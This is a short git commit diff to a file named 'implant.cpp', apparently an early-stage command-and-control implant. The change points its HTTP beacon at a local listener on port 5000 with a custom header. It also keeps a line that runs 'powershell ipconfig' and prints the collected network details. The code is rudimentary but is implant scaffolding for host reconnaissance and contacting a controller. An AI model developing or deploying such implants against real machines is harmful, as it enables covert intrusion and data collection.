8b6a46fbed5a8a929e090c65738638b0d17ca3ac
Jason Chow <79327473+JasonChow320@users.noreply.github.com>
2021-12-04 17:45:49 -0500

    Update implant.cpp

--- implant/implant.cpp
+++ implant/implant.cpp
@@ -7,8 +7,10 @@
 int wmain()
 {
     HTTP *client = new HTTP();
-    int port = 0, tls = 0;
-    std::wcout << client->makeHttpRequest(L"google.com", port, L"/", tls) << std::endl;
+    int port = 5000, tls = 0;
+    client->additionalHeader = L"ch0nk:lol";
+    client->header_size = 9;
+    std::wcout << client->makeHttpRequest(L"localhost", port, L"/", tls) << std::endl;
     
     std::system("powershell ipconfig >C:\\Users\\User\\test.txt");
     std::cout << std::ifstream("C:\\Users\\User\\test.txt").rdbuf();
